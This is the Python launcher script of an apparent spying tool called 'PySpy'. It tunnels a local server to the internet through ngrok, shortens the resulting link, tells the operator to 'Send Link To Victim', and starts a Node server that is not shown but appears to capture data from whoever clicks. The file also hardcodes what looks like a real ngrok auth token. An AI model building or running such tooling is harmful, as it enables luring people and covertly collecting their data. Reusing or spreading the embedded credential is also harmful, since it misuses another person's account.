import os
import requests
import json
from pyngrok import ngrok, conf
from url_extractor import url_extract
from manipulate_records import read_records, del_records

try:
    os.system('cls')
except:
    os.system('clear')

print(" ____        ____              ")
print("|  _ \ _   _/ ___| _ __  _   _ ")
print("| |_) | | | \___ \| '_ \| | | |")
print("|  __/| |_| |___) | |_) | |_| |")
print("|_|    \__, |____/| .__/ \__, |")
print("       |___/      |_|    |___/ ")
print("v1.0")
print("-------------------------------")
print("+   developed by: mohan putta +")
print("+        Mohan20001/pyspy.git +")
print("-------------------------------")


def menu():
    print()
    print(" Start -? -> Starts the pyspy server")
    print("       -y -> Serves a YouTube link")
    print(" Help     -> Shows menu")
    print(" 0        -> Terminates Script")

menu()

def excute_commands(cmd):
    cmd_l = cmd.split()
    if len(cmd_l) == 1:
        match cmd_l[0]:
            case "start":
                start_server()
            case "0":
                exit()
            case "help":
                menu()

def start_server():
    try:
        print("[!] Send Link To Victim")
        conf.get_default().auth_token = "2K9q5ajABw8G2yq7a0PXCUvuOgV_753xRBrXYKTtBZgCNm51X"
        url = ngrok.connect(5000, "http")
        x = requests.get('https://api.shrtco.de/v2/shorten?url=' + str(url_extract(url))).text
        json_data = json.loads(x)
        print('[+] '+ json_data['result']['full_short_link'])
        print("[+] "+ str(url_extract(url)))
        os.system("node server.js")
    except:
        print(" [Err] Something went wrong..!")
        print()    

while True:
    try:
        print()
        cmd = input("PySpy>> ")
        cmd = cmd.lower()
        excute_commands(cmd)
    except KeyboardInterrupt:
        print(' Exit...')